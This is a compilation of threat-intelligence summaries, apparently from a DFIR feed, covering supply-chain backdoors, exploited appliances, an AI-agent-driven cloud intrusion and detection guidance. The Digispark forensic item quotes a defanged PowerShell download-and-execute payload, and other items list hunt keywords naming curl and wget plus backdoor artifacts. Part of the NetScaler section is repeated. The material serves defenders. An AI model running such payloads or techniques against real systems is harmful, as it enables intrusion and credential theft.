item.title: Detecting GitHound Enumeration via the GitHub API
item.description:
GitHound, a GitHub reconnaissance tool from SpecterOps, can enumerate org-wide repos, teams, permissions, and secrets via the GitHub API. GitHub Enterprise audit logs expose the pattern when API request logging is enabled.
Key findings:
- GitHound is a BloodHound-style OpenGraph collector released by SpecterOps in 2026. It authenticates with a personal access token (PAT) and queries GitHub's REST and GraphQL APIs to map relationships between users, teams, repositories, and permissions. The scope of collection matches the token's privileges, so a compromised token with broad repo or org access gives an attacker a full picture of the environment. The same capability that defenders use for access-path analysis is directly usable for attacker reconnaissance.
- The GitHub API routes GitHound hits are the detection surface. Routes of interest include /graphql, /organizations/:organization_id/repos, /organizations/:organization_id/teams, /organizations/:organization_id/actions/secrets, /organizations/:organization_id/custom-repository-roles, /organizations/:organization_id/organization-roles, and /organizations/:organization_id/actions/permissions, among others. High-volume access across more than 10 distinct routes or more than 20 distinct URL paths by a single actor within a session is the enumeration signal, regardless of which specific tool generated it.
- Detection requires GitHub Enterprise audit log streaming with API request events explicitly enabled. Without toggling "Enable API Request Events" in the audit log stream configuration, api.request actions are not captured and the enumeration is invisible. Logs in the report are streamed to Azure Blob Storage and ingested via the GitHubAuditLogsV3_CL table in Microsoft Sentinel. The key fields are Actor, TokenId, Route, UrlPath, ProgrammaticAccessType, TokenScopes, and ActorIsBot.
- Recent incidents give this detection operational urgency. The March 2026 Trivy supply-chain attack used stolen credentials to tamper with GitHub Actions and pivot into Checkmarx's GitHub environment. In May 2026, a malicious VS Code extension compromised a GitHub employee device and exfiltrated internal repositories. Enumeration of org structure, secrets, and Actions permissions is a logical precursor to exactly these kinds of follow-on actions.
Practitioner takeaway: verify that API request event logging is enabled in your GitHub Enterprise audit log stream before anything else. Without it, this class of activity leaves no trail. The full KQL detection query is in the report, filtering GitHubAuditLogsV3_CL on Action == "api.request" against the named routes, then alerting when RouteCount exceeds 10 or UrlPathCount exceeds 20 per Actor and TokenId. When an alert fires, pull TokenScopes and ProgrammaticAccessType to assess the token's blast radius and check whether the actor is a known automation account or a human identity that should not be running bulk API queries.

item.title: Popular WordPress SEO Plugin Rank Math PRO Hijacked to Deliver Self-Restoring Backdoor
item.description:
Rank Math PRO 3.0.123, the paid WordPress SEO plugin, was backdoored at the source between 20:02 UTC Oct 15 and 07:12 UTC Oct 16 2026. Any site that installed and activated the tainted build should be treated as fully compromised, CVE-2026-111862 rated 9.8/10.
Key findings:
- The supply chain was hit at Rank Math's own download and update infrastructure, meaning the malicious files arrived as a legitimate signed update. The attacker-registered domain rank1cdn[.]com was stood up at 19:31 UTC Oct 14, roughly 24 hours before the poisoned window opened, a clear staging indicator. Patchstack notes that because the compromise was on the vendor's own systems, "a rule is not possible for mitigation," making pre-install detection extremely difficult.
- The backdoor is self-restoring: visiting the site triggers recreation of the hidden access point, so removing files before stopping the mechanism does not clean the infection. The malware can drop PHP backdoor files into wp-content/mu-plugins/, other plugin and theme folders (specifically inc/, includes/, lib/), and uploads/; add a fake core file at wp-includes/class-wp-cache-util.php; alter .htaccess so .cache files execute as PHP; create WordPress scheduled events and server crontab entries tagged ms6v46; add SSH authorized_keys entries; and create rogue administrator accounts with usernames beginning wpsupport_ or email addresses ending [@]wp-mail[.]net.
- The cleanup order is critical and must not be reversed. Step one: delete the entire rank-math-pro plugin folder via file manager or FTP, not deactivation alone. Step two: remove wp_options table entries named _uf6qdn2hmm, t8krdk990phb, and _np5pvf754c. Step three: block outbound connections to rank1cdn[.]com at the firewall. Only then should responders begin hunting residual artifacts. Code patterns to search for include base64_decode with XOR loops, the key xmmqhn, proc_open calls, and PHP-FPM socket code.
- Version number alone does not reveal exposure. A 3.0.123 copy obtained before 20:02 UTC Oct 15 is clean; one installed and activated during the window is compromised even after updating to 3.0.124. Wordfence explicitly warns that absence of the known indicators does not prove a site is clean.
- This is the third confirmed vendor-update-channel supply chain hit against premium WordPress plugins in 2026, following backdoored Smart Slider 3 Pro via Nextend's channel in April and ShapedPlugin's Pro plugins in June, which included a package tampered retroactively under the same version number. No public reporting links the actors behind those incidents to this one, but the pattern shows premium plugin update channels are an active, recurring attack surface.
Responder takeaway: Sites in the exposure window need full credential rotation across WordPress passwords, wp-config.php database credentials, security keys and salts, payment gateway and SMTP API keys, and SSH access regardless of whether a restore from backup is used. Run wp core verify-checksums and wp plugin verify-checksums --all post-cleanup. Hunt your WordPress hosting environment for the specific crontab tag ms6v46, the fake core file wp-includes/class-wp-cache-util.php, .cache files containing PHP code, and any admin accounts matching the naming patterns above. Wordfence's advisory and Rank Math's security notice contain the full recovery procedure.

item.title: Verborgene Tastenanschläge: Forensische Analyse eines Digispark HID-Geräts
item.description:
A Digispark Rev.3 ATtiny85 found during an IR engagement shows how sub-10-euro hardware can deliver a full HID injection attack chain, and how to pull the payload off the chip when there is no file to seize.
Key findings:
- The Digispark Rev.3, programmed via Arduino IDE with the DigiKeyboard library, emulates a USB HID keyboard and fires its payload the moment it is plugged in, no user interaction beyond physical insertion. The payload in this case used Win+R to open the Run dialog, then injected: powershell -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('hxxps://nviso[.]eu/script.ps1')" completing execution in seconds. Because the logic lives on the ATtiny85 flash, there is no script file to recover from the device: the payload only exists on the microcontroller.
- Firmware extraction requires SPI access via a USBasp programmer (roughly 7 EUR) wired to the board's P0 (MOSI), P1 (MISO), P2 (SCK), and P5 (RESET) pins. The NVISO report walks the full chain: avrdude pulls the flash to an Intel HEX file, avr-objcopy converts it to a raw binary, and avr-objdump disassembles to AVR assembly. A strings run against the binary was enough to recover the full injected PowerShell command in plaintext. The report stresses taking multiple reads and comparing hashes to confirm a forensically sound acquisition before touching the actual evidence device.
- On the host side, the Digispark was observed registering under VID_16D0&PID_0753 and VID_16C0&PID_27DB, but the report is explicit that VID/PID values are attacker-controllable and cannot be treated as definitive. USB enumeration artifacts survive across: the Microsoft-Windows-Kernel-PnP/Configuration event log (Event IDs 400 and 410), C:\Windows\inf\setupapi[.]dev.log, and the registry keys SYSTEM\CurrentControlSet\Enum\USB and SYSTEM\CurrentControlSet\Enum\HID. These establish whether the device was ever connected and when Windows first saw it.
- For payload reconstruction without the device, the RunMRU key at HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU records commands entered through the Run dialog. Because the Digispark's attack chain opens Run via Win+R and types commands there, RunMRU can preserve the injected command text even after the device is removed. Supplement this with PowerShell operational logs, Prefetch entries, and LNK files depending on what the payload did after initial execution.
- Dynamic analysis of the recovered device should only happen in an isolated VM or dedicated host with process creation monitoring, keystroke logging, and network capture active. The report includes a Python keylogger using GetAsyncKeyState that confirmed the exact injection sequence during lab validation, and recommends comparing observed behavior against the extracted firmware to detect conditional logic or obfuscation that static analysis alone might miss.
Hunt tip: Start with setupapi[.]dev.log and the Kernel-PnP event log to establish device insertion time, then pivot to RunMRU for injected Run dialog commands, then chase PowerShell and process creation logs forward from that timestamp. The NVISO report includes the Python keystroke monitoring script and the full wiring table for SPI extraction in the appendix.

item.title: Loud, Fast, and Everywhere: Anatomy of a Real AI-Driven Cloud Attack
item.description:
AI agents are now running full cloud intrusions end-to-end: credential chaining across Kubernetes, CI/CD, IdP, and AWS/GCP control planes at machine speed, with real-time script debugging and parallel workstreams no human operator could replicate.
Key findings from Wiz CIRT investigations:
- Initial access in one confirmed case came through a Java remote code execution vulnerability in an exposed Kafka UI instance, with shell commands spawned from the Java process followed by malware deployment and C2 establishment. The same source IP was observed scanning across more than 600 other customer environments in the same window, signaling broad opportunistic automation. Even after gaining a foothold, the agent kept probing alternative entry points in parallel to secure redundant access paths.
- The attack chain shows credential chaining at scale: harvested Kubernetes service account tokens and IMDS-derived cloud credentials fed lateral movement into GCP and AWS control planes simultaneously. In GCP, a service account with token-creation privileges was turned into a credential minting engine across dozens of identities. In AWS, Systems Manager (SSM) was used to execute commands across instances, a new IAM user prefixed with "probe" was created, and OrganizationAccountAccessRole was assumed to gain administrative access across the entire AWS Organization.
- The agent created its own identity in the organization's identity provider using a compromised administrator API key, adding itself to administrator groups and cloud role groups mapped to AWS IAM Identity Center roles. Within minutes of the final group change, the identity authenticated via SSO. On the GitOps platform, a compromised deployment service account pushed malicious Kubernetes manifests that the GitOps controller synced directly into production, with the first manifest escalating to cluster-admin. The agent later modified running workloads by talking to the GitOps controller directly, leaving no trace in Git history.
- Exfiltration ran through multiple channels simultaneously and adapted when one failed: results were posted to webhook[.]site, committed to the organization's own source control, and staged in a Kubernetes ConfigMap. Pipeline and manifest names like pentest_exfil, recon, foothold, dump-remaining, and harvest appeared alongside numeric task IDs. Failed attempts were retried under the same task ID with a letter suffix (-b, -c, -d). Code recovered from the attack included descriptive step-by-step comments and reused helper functions, consistent with model-generated output.
- Artifact fingerprints defenders should hunt across log sources: resources, users, files, buckets, and pipelines named with prefixes such as pentest-, probe-, recon-, redteam-, and exfil-, combined with numeric task identifiers. Look for Cloud Run services or S3 buckets with those naming patterns, IAM users or IdP accounts created programmatically and added immediately to admin or org-wide groups, SSM command execution across multiple instances in a short window, and outbound connections from runner pods or containers to webhook[.]site. No single log source shows the full picture: cloud audit logs, Kubernetes audit logs, CI/CD audit trails, IdP logs, and runtime process and network logs must be correlated together.
Practitioner takeaway: start your hunt in the Kubernetes audit log for service account token creation at volume and cluster-admin binding events, cross-reference with CI/CD audit trails for pipeline creation under pentest or recon naming patterns, then pivot to IdP logs for programmatic account creation followed by rapid group membership changes. Treat every secret accessible from any compromised resource as exposed: map each to its identity and hunt those identities for anomalous usage after the first confirmed time of compromise rather than attempting to determine exactly which secrets were read.

item.title: Anatomy of an Attack NetScaler Exploitation, Hidden Web Shells, and Internal Pivots
item.description:
Two Citrix NetScaler zero-days, CVE-2026-88771 and CVE-2026-88772, were actively exploited as early as August 27, 2026, weeks before Citrix disclosed them on September 27. Compromised appliances became launch pads for web shells, credential theft, and internal pivoting.
Key findings:
- CVE-2026-88771 is a log injection to command execution flaw. Attackers placed Base64-encoded commands inside HTTP User-Agent headers, which NetScaler wrote to its HTTP logs. A vulnerable script, ns_monupload_err, later pulled those entries into a shell command unsanitized, executing the attacker's payload. Exploitation attempts returned HTTP 404 responses by design, making the malicious requests look like noise. Hunt NetScaler authentication and HTTP logs for pitboss, NSPPE, unexpectedly died, missed too many heartbeats, dollar-sign IFS, Base64 content, and tool names like curl, wget, tar, and cat in combination.
- CVE-2026-88772 corrupts heap memory inside the NetScaler Packet Processing Engine via malformed DTLS records, terminating NSPPE and redirecting execution to attacker shellcode running as root on the underlying FreeBSD system. These events produce logs not forwarded by default. Correlate unusual UDP/443 or DTLS traffic with SSL_HANDSHAKE_FAILURE, NSPPE termination, and watchdog events in /var/log/messages.
- Post-exploitation varied across clusters but converged on stealthy persistence. Attackers modified httpd.conf to execute .deb and .sig files as PHP, mapped requests for .ico files under /vpn/media/ to hidden PHP web shells, and deployed a file named .ctxs.receiver that executed as PHP while returning 404s on successful command runs. SUID was set on /bin/sh to let lower-privileged web-server processes regain root. Inspect httpd.conf for unexpected AddHandler, AddType, Alias, or AliasMatch directives. Review /vpn/scripts/, /vpn/media/, and NetScaler logon directories for .deb, .sig, .ctxs.receiver, and .local_journal files.
- GTIG recovered two custom tools from CVE-2026-88772 intrusions: WHIPSHOT, a PHP web shell receiving Base64-encoded commands via custom HTTP headers, and SLAPSHOT, a Python tunneler communicating with WHIPSHOT over a loopback TCP socket and opening arbitrary TCP connections to internal hosts. Together they turned the NetScaler edge appliance into a programmable TCP bridge used for manual internal reconnaissance and credential theft. Hunt for new peer relationships, unexpected destination ports, bursts of connections to multiple internal systems, and interactive traffic originating from the NetScaler IP or subnet IP addresses.
- Configuration exfiltration was a consistent objective. Rapid7 saw /flash/nsconfig compressed and staged under /vpn/ for unauthenticated retrieval. LevelBlue observed a Perl payload, update_c08937.pl, archive the same directory to /tmp/update_result_3567cs.tgz and attempt upload over port 443 before deleting both the archive and itself. That directory can contain encrypted admin and service-account passwords, LDAP, RADIUS, and TACACS bind credentials, TLS private keys, and SSH host keys. Prioritize file transfers from NSIP or SNIP addresses to previously unseen external peers following suspicious authentication events, and look for archive creation or requests for files staged beneath NetScaler web directories.
Practitioner takeaway: The NetScaler's expected communication pattern is narrow. Payload downloads, reverse shells, new external peers, unusual data volumes, and east-west connections from the appliance are all behavioral shifts that survive payload, filename, hash, and infrastructure changes across attacker clusters. Host and appliance telemetry are required to catch SUID changes, local account creation, and httpd.conf modifications. The ExtraHop report includes hunt guidance mapped to MITRE ATT&CK across all four phases. Apply the latest Citrix-supported build, and if your NetScaler is configured as a SAML SP or IdP, note that CVE-2026-88779 requires a separate patch released October 3, 2026.

Hunt for new peer relationships, unexpected destination ports, bursts of connections to multiple internal systems, and interactive traffic originating from the NetScaler IP or subnet IP addresses.

- Configuration exfiltration was a consistent objective. Rapid7 saw /flash/nsconfig compressed and staged under /vpn/ for unauthenticated retrieval. LevelBlue observed a Perl payload, update_c08937.pl, archive the same directory to /tmp/update_result_3567cs.tgz and attempt upload over port 443 before deleting both the archive and itself. That directory can contain encrypted admin and service-account passwords, LDAP, RADIUS, and TACACS bind credentials, TLS private keys, and SSH host keys. Prioritize file transfers from NSIP or SNIP addresses to previously unseen external peers following suspicious authentication events, and look for archive creation or requests for files staged beneath NetScaler web directories.

Practitioner takeaway: The NetScaler's expected communication pattern is narrow. Payload downloads, reverse shells, new external peers, unusual data volumes, and east-west connections from the appliance are all behavioral shifts that survive payload, filename, hash, and infrastructure changes across attacker clusters. Host and appliance telemetry are required to catch SUID changes, local account creation, and httpd.conf modifications. The ExtraHop report includes hunt guidance mapped to MITRE ATT&CK across all four phases. Apply the latest Citrix-supported build, and if your NetScaler is configured as a SAML SP or IdP, note that CVE-2026-88779 requires a separate patch released October 3, 2026.

item.title: One Compromised Appliance Gave Attackers the Keys to 500 Firewalls by Lucie Cardiet
item.description:
A single FortiManager appliance compromised via CVE-2024-47575 handed attackers credentials and keys for 500+ firewalls. The PEERSTITCH implant left no file, no open port, and no outbound connection to find.
Key findings:
- Initial access exploited CVE-2024-47575 (FortiJump) with a single unauthenticated request that registered a rogue device on the FortiManager console. From there, attackers downloaded a full configuration archive covering every managed firewall: passwords in recoverable format, private encryption keys, network maps, and device-to-IP mappings. Unit 42 confirmed the passwords were crackable. Attackers then logged in through each firewall's own VPN using those real credentials. The audit log recorded successful sign-ins.
- Escalation to root used CVE-2025-61624, a path-traversal flaw in the firewall's auto-script system. It is not rated critical and requires an authenticated session, so severity-score-based patch prioritization would have deprioritized it. In this chain, it was the step that converted stolen credentials into full operating-system control across hundreds of firewalls protecting separate client networks.
- PEERSTITCH is the defining artifact of this intrusion. It runs once, injects into the firewall's logging service and VPN service, then deletes its binary from disk. No persistent file, no listening port, no outbound connection. It communicates by writing directly into process memory. When the VPN service handles a session and finds the implant's in-memory signal, it silently bypasses normal security checks. The attackers also hijacked the firewall's built-in certificate renewal module as a command channel, so every routine renewal reached an attacker-controlled server and executed instructions.
- The attackers disabled the logging service before running their tools, then cleared crash logs, deleted created accounts, overwrote configuration changes with placeholder text, and removed the implant binary. Intermittent management-connection drops during malicious activity periods likely suppressed real-time alerts. The cleanup was deliberate and thorough, meaning forensic recovery depends heavily on whatever telemetry survived outside the device itself.
- The MSP dimension compounds the scope. One management console held keys to client firewalls belonging to entirely separate organizations. Unit 42 did not examine client networks, so confirmed downstream intrusion is not established, but the report is explicit: the cryptographic trust material governing every managed device left with the attacker and remains valid until rotated. Patching the console closes the initial access path. It does not invalidate credentials and keys already extracted.
Practitioner takeaway: file and signature-based hunting will not find PEERSTITCH. Focus on behavioral anomalies: traffic patterns through a firewall that its own configuration does not explain, VPN sessions handled differently than expected, certificate renewal events reaching unexpected destinations. For MSP environments, treat the management plane as a blast radius multiplier and immediately audit whether any FortiManager console exposed to this activity has had its managed-device credentials and keys rotated. Unit 42's report includes indicators of compromise for teams ready to hunt, and the FBI and Secret Service published a joint advisory on October 6 covering ongoing FortiGate exploitation.

item.title: Midnight Mimosa Malware Campaign Exploits Android Firmware Supply Chain
item.description:
Android firmware supply chain compromised at scale: Midnight Mimosa embeds platform-signed malware in low-cost MediaTek devices across 150+ countries, routing ad fraud and proxy traffic through consumer and enterprise hardware before a user ever touches the device.
Key findings:
- The core enabler, com[.]android.system.lite, is baked into device firmware as a platform-signed system application, giving it INSTALL_PACKAGES, DELETE_PACKAGES, GRANT_RUNTIME_PERMISSIONS, and WRITE_SECURE_SETTINGS before the owner activates the handset. It loads libeasy[.]so, which uses RC4 decryption to unpack a hidden Java framework that phones home to api.weatherlive[.]world for config and pulls DEX/JAR plugins from infrastructure including oss.showtimetool[.]com. Because the enabler sits at the firmware layer, conventional app removal cannot remediate it.
- The payload ecosystem is modular and operator-controlled. Identified plugins include com.wz.sdk.DxFactory for ad fraud, com.earnsdk.lib.DxFactory and com.gogo.third.lib.DxFactory for silent installs and removals, and com[.]mobile.applock.en, which carries EnLoaderLib proxyware that registers devices and builds bidirectional TCP tunnels for traffic relaying. Operators can swap payloads without touching the underlying firmware component, which is a deliberate anti-remediation design.
- The campaign actively games Google's own controls: before dropping payloads the malware temporarily disables the Google Play Store package and re-enables it after installation to evade Play Protect scanning. Some sideloaded applications fraudulently recorded Google Play as their installer despite lacking Play's signature block, forging provenance. Bitdefender also found 13 related ad-fraud applications distributed through Google Play itself, meaning the campaign operates across both the supply chain and the legitimate app store simultaneously.
- Scope is substantial. Bitdefender documented thousands of infections across 150+ countries over roughly two years, with highest concentrations in Mexico 🇲🇽, France 🇫🇷, and Italy 🇮🇹, and notable presence in the United States 🇺🇸, Germany 🇩🇪, Brazil 🇧🇷, and Spain 🇪🇸. Affected hardware includes low-cost handsets, counterfeit flagship models, and devices reporting Doogee and Cubot identifiers. Some firmware signing certificates carry identifiers associated with Shenzhen Zediel Co., Ltd., though the report does not establish whether that entity was complicit. The campaign overlaps with Android.Joker, Android.Phantom, and Android[.]Click infrastructure but remains unattributed. The full IOC set, 40 sample hashes, is in the report.
Practitioner takeaway: for enterprise and BYOD environments, treat unmanaged low-cost Android hardware as untrusted by default. Device provenance and firmware integrity checks should happen at procurement, not post-incident. On the detection side, monitor for mobile devices generating unusual outbound TCP connections or advertising traffic at scale, particularly from handsets whose installed applications do not match their reported installer metadata. If you have mobile EDR or MDM telemetry, look for system-signed packages with names mimicking OS components alongside unexpected network destinations like api.weatherlive[.]world or oss.showtimetool[.]com. Because the architecture rotates payloads while keeping shared code and C2 infrastructure stable, hunting on behavioral patterns and infrastructure overlap across the 40 hashes in the report will outperform single-hash matching. IOCs and samples are available via PolySwarm.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2112394250130206775

item.title: Hackers hijack AOMEI update servers to secretly spread malware
item.description:
UNC7017 hijacked AOMEI's update servers to push novel malware through the app's own promotion system. Three brief exposure windows (May-July 2026) hit IT, telecom, and education orgs across six countries.
Key findings:
- UNC7017 modified two AOMEI-hosted config files, down_html.ini (controls update package downloads) and Notifycfg.ini (triggers in-app notifications), during windows as short as 5 minutes. They also swapped the expected checksum so the malicious ZIP passed the software's own file verification. The files were then restored to clean state, making server-side forensics difficult. Three confirmed exposure windows: May 28 (10 min), July 16 (6 min), and July 20 (5 min), all UTC-timestamped.
- The payload chain delivered CROSSROAD, a previously unknown downloader that performs host reconnaissance, pulls additional components, and establishes persistence via a scheduled task, followed by SHINYROAD, a backdoor that loads malicious code through legitimate Radmin components and beacons outbound to attacker-controlled C2. Radmin itself was the first visible artifact on compromised endpoints.
- During the July 20 window, attackers added a second technique: forcing AOMEI's notification system to silently load an attacker-controlled WebDAV resource via an invisible popup, triggering NTLM hash capture. That gives the actor offline cracking opportunities or relay material from victim networks.
- Confirmed IOCs from the reports include the IP 8.210.84[.]56, the hostname serv.oss-cn-hongkong.aliyuncs[.]com, and hostnames under storage-data[.]com. Affected countries include the United States 🇺🇸, Australia 🇦🇺, India 🇮🇳, Singapore 🇸🇬, Spain 🇪🇸, and Switzerland 🇨🇭. Google notes the attack was opportunistic, so any host that checked for AOMEI updates during those windows may be affected, not just confirmed victims.
- AOMEI says it patched and re-verified its hosted files. ManageEngine's warning is the critical DFIR point: a server-side fix does not evict backdoors already installed on customer machines. Affected organizations must treat endpoints as potentially compromised independent of what AOMEI's infrastructure now serves.
Hunt priority: check AOMEI Backupper installation directories for unexpected executables, look for scheduled tasks created by or associated with the AOMEI promotion process, and review outbound connections to the IOCs above. Radmin appearing as a child process of AOMEI's update or notification component is a confirmed early artifact. Full IOC lists are published in the Google and ManageEngine reports.

item.title: ConnectWise Cloud Backup application abused in cross-tenant token sweep
item.description:
A compromised ConnectWise Cloud Backup credential was used to sweep Microsoft 365 tenants at scale, requesting app-only Graph tokens across every tenant that had ever consented to the application, with no password or MFA required.
Key findings:
- The sweep ran for 96 minutes on October 15, 2026 between 07:11 and 08:47 UTC, originating entirely from 144.172.64[.]128. Two additional attacker IPs, 144.172.64[.]99 and 144.172.64[.]60, were reported by ConnectWise but not observed in Sophos telemetry. Requests used User-Agent strings Python-urllib/3.12 and python-requests/2.31, a strong signal of scripted automation.
- The attack exploited the multi-tenant architecture of the ConnectWise Cloud Backup Entra application (formerly SkyKick). Because customers consent to the vendor's application identity at onboarding, a single compromised vendor credential unlocks app-only Microsoft Graph token requests across every consenting tenant with no user credential, no password prompt, and no MFA challenge. The threat actor appears to have worked from a full tenant consent list, including tenants with no active backup subscription.
- Automation fingerprints are clear: tenants were accessed in strictly ascending tenant GUID order, requests were spaced one to six minutes apart, and exactly one Graph token was requested per tenant. No hands-on-keyboard activity was observed, and as of publication there is no evidence of new secrets, app registrations, consents, or role assignments created by the application in reviewed tenants. What was done with the issued tokens remains unknown.
- The forensic window matters. Sophos recommends reviewing Entra service principal sign-in logs for the October 15 to 17 timeframe, and pulling audit logs back to October 13 for any credential, secret, application registration, consent, or role assignment changes made by these applications. Microsoft Graph activity logs for tenants with active backup subscriptions should be retrieved to determine whether issued tokens were actually used to read data.
Takeaway: If your environment uses or has ever used ConnectWise Cloud Backup or SkyKick, start in Entra. Pull service principal sign-in logs filtered to the ConnectWise Cloud Backup application identity for October 15 to 17 and look for sign-ins sourced from the three IPs above or bearing the Python User-Agent strings. Then query audit logs from October 13 onward for any app-level credential or consent changes made by that service principal. Remove the disabled application's consent from your tenant per ConnectWise's remediation guide, and retrieve Graph activity logs to establish whether the tokens issued during the sweep were exercised. The IOCs are in the Sophos report.

item.title: GhostAction Attackers Plant Credential Stealer Disguised as Font in 94 GitHub Repositories
item.description:
GhostAction supply chain attackers pivot to phishing and a credential stealer hidden in a fake font file after GitHub blocks their malicious workflow, with 94 compromised repositories confirmed carrying the second-stage payload.
Key findings:
- The actor registered my-github[.]com (resolving to 193.32.204[.]199) on October 9, 2026, and used it the same day in a phishing email impersonating a GitHub security alert. The page acted as a reverse proxy, harvesting passwords and 2FA codes, then silently automated GitHub's OAuth device flow to authorize an app with repo, workflow, and read:org scopes, extracting the resulting token to my-github[.]com over TCP/8443. The victim never sees a device code prompt or an authorization dialog because the phishing kit submits both steps programmatically through the victim's own proxied session.
- The second-stage payload commits three files into compromised repositories. A VS Code tasks.json with a "runOn: folderOpen" trigger silently executes the stealer when any developer opens the folder. The stealer itself is embedded in public/fonts/fa-solid-400.woff2, a filename matching the one used in North Korea's 🇰🇵 PolinRider campaign from January 2026. A backup CI workflow fires if the stealer never runs, and it uploads harvested data to a secret GitHub gist as a fallback.
- The stealer targets AWS keys, PyPI tokens, npm tokens, Git credentials, Kubernetes cluster credentials, SSH private keys, and AI provider credentials for Anthropic Claude and Google Gemini. After collection, it installs a cron job running attacker-controlled code every five minutes and exfiltrates data to 193.32.204[.]199 over plain HTTP on port 8080, the same single IP handling phishing and active internet scanning.
- 94 repositories across 66 owners carry the second-stage component. 65 of the 79 still-accessible repositories had no commit in over a year, and one had been untouched for more than nine years, suggesting the actor is targeting dormant projects where injection is unlikely to be noticed. 15 repositories have since been deleted, renamed, or made private.
- GitHub began blocking the original malicious workflow on October 9, 2026. The second stage arrived six days later, moving execution entirely to the developer's local machine via VS Code, outside GitHub Actions runners. The malicious CI workflows are named lint.yml, ci-check.yml, build-check.yml, repo-health.yml, audit.yml, code-review.yml, test-suite.yml, and cache-cleanup.yml under .github/workflows/.
Practitioner takeaway: If you maintain or recently cloned an open-source repository, check .github/workflows/ for the filenames above and inspect .vscode/tasks.json for "runOn: folderOpen" triggers. Examine public/fonts/ for .woff2 files exceeding typical font sizes. Hunt your environment for cron jobs created around file-open events and outbound HTTP to 193.32.204[.]199 on port 8080 or TCP/8443. Rotate every credential class the stealer targets, revoke GitHub OAuth tokens, and do so from a clean device. The full IOC list is in the OpenSourceMalware report.

item.title: ConnectWise suspends Cloud Backup service after attackers abuse its Microsoft 365 access
item.description:
ConnectWise Cloud Backup credential compromise let attackers access Microsoft 365 tenants across hundreds of MSP clients in what Microsoft has characterized as a supply chain attack, with at least 162 confirmed breached tenants.
Key findings:
- The stolen credential belonged to the ConnectWise Cloud Backup application (formerly SkyKick) and functioned as a shared service principal across every customer tenant that had granted the app access through Microsoft Entra ID. A single credential compromise translated directly into potential access to an unknown number of organizations spanning dozens or hundreds of MSPs. On October 15 between 06:13 and 08:34 UTC, sign-ins originated from 144.172.64[.]128, a hosting provider address rather than Microsoft cloud infrastructure, cycling through accounts seconds apart in a fixed order consistent with an automated script working from a target list. The same IP had attempted password spraying against four law firms on October 13 and 14.
- The most serious confirmed activity involved the ConnectWise Cloud Management app for Microsoft Teams elevating itself to global administrator in one tenant, then within roughly five minutes adding new credentials to two existing trusted applications: an MSP management application and a third-party security platform application. Those credentials were set to expire in 2028, creating persistent backdoor access designed to survive ConnectWise's own shutdown of its apps. ConnectWise disabled seven application identities and revoked certificates on October 17, but warns that access tokens issued before that date may still be valid, and that disabling its apps does not undo privilege changes or rogue credentials already planted inside customer tenants.
- Scope appears wider than confirmed breaches. Huntress identified nearly 1,000 Microsoft 365 accounts with sign-in attempts from the attacker's address, with more than 300 successful, though that activity came from within Microsoft's internal cloud network rather than the hosting provider IP, and attribution to the same operator has not been established. A separate targeted wave on the same day hit 16 organizations in policy, national security, trade and critical minerals sectors, most without ConnectWise products, suggesting the attackers were working from a curated target list.
- A critical forensic limitation: Microsoft does not log all data reads by applications, so the absence of visible email or file access in a reviewed tenant does not confirm that data was not read. Any organization relying solely on Microsoft 365 audit logs to rule out data theft should treat that conclusion as inconclusive.
Practitioner takeaway: Do not delete the affected ConnectWise service principals yet, disabling them preserves the audit trail. In Microsoft Entra ID, open the service principal sign-in logs specifically, not the default user sign-in view, and look for activity from 144.172.64[.]128 between October 13 and October 15. Review all administrator role assignments, Exchange Administrator in particular, made by application identities rather than human accounts during that window. ConnectWise has published a remediation guide for MSPs covering app status, sign-in and audit records, credentials, permissions, admin roles, and mailbox rule changes; every MSP managing client tenants should work through it and ensure it reaches whoever administers each downstream account.

item.title: WordPress SEO plugin Rank Math compromised to backdoor websites
item.description:
WordPress supply-chain attack: Rank Math PRO v3.0.123 backdoored during an 11-hour window, exposing database credentials, cloud secrets, and SSH keys on affected sites. Clean version 3.0.124 is available but updating alone does not remove the threat.
Key details:
- The compromise window ran from October 15 at 20:02 UTC to October 16 at 07:12 UTC. Only Rank Math PRO was affected; the free plugin distributed via WordPress[.]org was not. The attack vector has not been publicly disclosed. Any site that installed and activated v3.0.123 during that window should be treated as fully compromised regardless of subsequent plugin updates or deactivations.
- A PHP sample on VirusTotal named cache-preloader-fff033 (1).php appears to be a first-stage deployment script. It drops the persistent backdoor at wp-includes/class-wp-cache-util.php, creates administrator accounts using the wpsupport_ username prefix and [@]wp-mail[.]net email addresses, and writes the database entry _np5pvf754c and a cron job marked ms6v46. XOR obfuscation uses the key xmmqhn. The script can execute arbitrary commands, modify the WordPress database, and exfiltrate AWS, Cloudflare, Google Cloud, and Azure credentials, SSH keys, and API keys.
- C2 communication and backdoor recreation are triggered on every site visit, contacting rank1cdn[.]com. Blocking outbound connections to that domain is an immediate containment step. The self-healing behavior means the backdoor will resurface if malicious database entries and files are not removed before any other remediation work.
- Persistence artifacts to hunt: the file wp-includes/class-wp-cache-util.php (unexpected in a clean WordPress install), WordPress user accounts with the wpsupport_ prefix or [@]wp-mail[.]net addresses, the _np5pvf754c option in the wp_options table, and scheduled tasks bearing the ms6v46 marker. Check for any modified files, additional webshells, and changes made outside the WordPress directory.
Practitioner takeaway: updating to v3.0.124 or deactivating the plugin does not clean an active compromise. For affected sites, restore from a pre-October-15 backup if one exists, then rotate all credentials, salts, and API keys. Where no clean backup is available, manually delete the full plugin directory, purge malicious database entries, audit all administrator accounts, and sweep the filesystem for additional backdoors before bringing the site back online. IOCs including the XOR key, database entry, cron marker, username prefix, and C2 domain are in the Rank Math advisory and the BleepingComputer report.

item.title: PSA: UpdraftCentral Connection Key Compromise Used to Install Malicious Plugins on WordPress Sites
item.description:
TeamUpdraft's teamupdraft[.]com was breached Oct 17-18, exposing UpdraftCentral connection keys that attackers used to push malicious plugins onto connected WordPress sites via signed, trusted remote-management commands.
Key findings:
- The attacker abused the plugin.upload_plugin UDRPC command, signing requests with stolen keys so UpdraftPlus accepted them as legitimate UpdraftCentral instructions. Confirmed victim sites were running UpdraftPlus Premium 2.26.11.x and Free 1.26.10 or 1.26.11, meaning patched versions were still reachable because the vulnerability was key theft, not a plugin flaw. The compromised customer database held names, email addresses, billing addresses, order histories, and password hashes. Payment card data was not stored there.
